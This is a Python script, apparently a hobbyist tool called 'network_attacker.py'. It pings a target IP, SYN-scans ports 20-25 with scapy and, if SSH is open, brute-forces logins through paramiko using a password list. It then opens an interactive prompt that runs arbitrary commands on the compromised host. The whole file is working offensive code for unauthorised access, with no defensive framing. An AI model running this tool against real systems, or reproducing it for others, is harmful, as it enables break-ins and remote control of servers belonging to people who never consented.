
import paramiko
import scapy.error
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


print("""
███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗    
████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝    
██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝     
██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗     
██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗    
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    

 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
network port scanner & ssh server bruteforce tool
network_attacker.py v1.0.0
Created by: ezra
""")

target_ip = input('[+] Enter Target IP:\n')
registered_ports = range(20, 26)
open_ports = []


# port scanning function
def scan_port(port):
    src_port = RandShort()
    syn_ack = 0x12
    conf.verb = 0
    syn_pkt = sr1(IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags='S'), timeout=0.5)
    if syn_pkt is None:
        return False
    if syn_pkt.haslayer(TCP) is None:
        return False
    else:
        if syn_pkt.getlayer(TCP).flags == syn_ack:
            sr(IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags='R'), timeout=2)
            return True


# check if host is up function
def check_host(ip):
    try:
        conf.verb = 0
        ping = sr1(IP(dst=ip) / ICMP(id=1), timeout=3)  # without id=1n wasn't able to ping sites like scanme.nmap.org
        if ping:
            print("\n[*] Target is Up, Beginning Scan...")
            return True
    except Exception() as error:  # trying to catch all errors
        if error:
            print(f"[!] Error {error} occurred")
            print(f"[!] Couldn't Resolve {target_ip}")
            return False


# BruteForce function
def brute_force(user_name, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    authenticated = False
    cmd = ""
    try:
        ssh_client.connect(target_ip, port=22, username=user_name, password=password, timeout=5)
        print(f"[*] Login Successful...\n[*] Password is {password} ")
        while True:
            cmd = input("[+] Enter Command:")
            if cmd.lower() == "exit":
                exit(0)
            else:
                std_in, std_out, std_err = ssh_client.exec_command(cmd)
                authenticated = True
                print(f"[*] Command Execute:\n{std_out.read().decode()} \n[!] Errors:\n {std_err.read().decode()}")
    except paramiko.ssh_exception.AuthenticationException as error:
        print(f"[!]{password} Failed")
        ssh_client.close()


# main scanning function
def main():
    # check_host(target_ip)
    try:
        if check_host(target_ip) is True:
            for port in registered_ports:
                status = scan_port(port)
                if status is True:
                    open_ports.append(port)
                    print(f"[*] Port {port} is Open")
            print("\n[*] Scan Finished")
            print(f"[*] Final List of Open Ports:\n[*] {open_ports}")
            if 22 in open_ports:
                choice = input("""\n[*]SSH Service Found on Port 22
                                \n[?]Would you like to BruteForce SSH Server?:(yes or no)""")
                if choice.lower() == "yes":
                    user_name = input("\n[+] Enter SSH UserName:")
                    with open(r"PasswordList.txt", "r") as pass_file:
                        for line in pass_file:
                            password = line.replace("\n", "")
                            brute_force(user_name, password)
                else:
                    print("[!] Exiting")
            else:
                exit(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard Interrupt")


if __name__ == "__main__":
    main()

